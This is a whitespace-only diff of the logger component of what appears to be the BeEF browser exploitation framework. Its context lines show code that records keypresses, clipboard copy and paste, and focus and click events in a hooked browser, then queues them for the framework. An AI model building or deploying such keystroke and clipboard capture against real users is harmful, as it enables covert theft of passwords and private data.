@@ -10,7 +10,7 @@
  * Provides logging capabilities.
  */
 beef.logger = {
-	
+
 	running: false,
     /**
     * Internal logger id
@@ -45,7 +45,7 @@ beef.logger = {
         this.data = null;
         this.mods = null;
     },
-	
+
 	/**
 	 * Starts the logger
 	 */
@@ -79,7 +79,7 @@ beef.logger = {
 			beef.logger.paste();
 		}
 	},
-	
+
 	/**
 	 * Stops the logger
 	 */
@@ -108,7 +108,7 @@ beef.logger = {
         c.target = beef.logger.get_dom_identifier(e.target);
         this.events.push(c);
 	},
-	
+
 	/**
 	 * Fires when the window element has regained focus
 	 */
@@ -117,7 +117,7 @@ beef.logger = {
         f.type = 'focus';
         this.events.push(f);
 	},
-	
+
 	/**
 	 * Fires when the window element has lost focus
 	 */
@@ -126,7 +126,7 @@ beef.logger = {
         b.type = 'blur';
 		this.events.push(b);
 	},
-	
+
 	/**
 	 * Keypress function fires everytime a key is pressed.
 	 * @param {Object} e: event object
@@ -139,7 +139,7 @@ beef.logger = {
 		}
 		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
 	},
-	
+
 	/**
 	 * Copy function fires when the user copies data to the clipboard.
 	 */
@@ -193,7 +193,7 @@ beef.logger = {
 			this.events.push(f);
 		} catch(e) {}
 	},
-	
+
 	/**
 	 * Pushes the current stream to the events queue
 	 */
@@ -204,7 +204,7 @@ beef.logger = {
 			this.stream = [];
 		}
 	},
-	
+
 	/**
 	 * Translate DOM Object to a readable string
 	 */
@@ -219,7 +219,7 @@ beef.logger = {
 		}
 		return id;
 	},
-	
+
 	/**
 	 * Formats the timestamp
 	 * @return {String} timestamp string
@@ -228,7 +228,7 @@ beef.logger = {
 		var d = new Date();
 		return ((d.getTime() - this.time) / 1000).toFixed(3);
 	},
-	
+
 	/**
 	 * Parses stream array and creates history string
 	 */
@@ -258,7 +258,7 @@ beef.logger = {
         k.mods = mods;
         return k;
 	},
-	
+
 	/**
 	 * Queue results to be sent back to framework
 	 */
@@ -270,7 +270,7 @@ beef.logger = {
 			this.events = [];
 		}
 	}
-		
+
 };
 
 beef.regCmp('beef.logger');
